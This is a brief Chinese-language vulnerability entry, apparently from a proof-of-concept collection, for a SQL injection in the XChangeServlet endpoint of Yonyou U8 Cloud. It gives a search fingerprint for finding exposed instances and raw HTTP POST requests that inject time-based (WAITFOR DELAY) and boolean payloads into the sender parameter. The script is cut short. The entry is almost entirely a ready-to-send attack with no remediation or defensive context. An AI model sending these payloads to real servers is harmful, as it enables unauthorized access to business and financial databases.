# 用友U8CloudXChangeServlet存在SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="用友-U8-Cloud"`

**请求体 / payload**
```
**POST /service/XChangeServlet?account=&receiver=1&receiver=test&sender=%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1**
**Host: **
**Content-Type: application/xml**
**Content-Length: 189**
**<?xml version="1.0" encoding='UTF-8'?>**
**<ufinterface billtype="凭证" filename="GL_Voucher_20260708.xml" isexchange="Y" proc="add" receiver="U8" replace="Y" roottag="voucher"></ufinterface>**
**POST /service/XChangeServlet?account=&receiver=1&receiver=test&sender=admin'+or+'9999'='9999 HTTP/1.1**
**Host: **
**Content-Type: application/xml**
**Content-Length: 189**
**<?xml version="1.0" encoding='UTF-8…（脚本共 761 字，完整版见原文）
```
- **预期**：200　|　—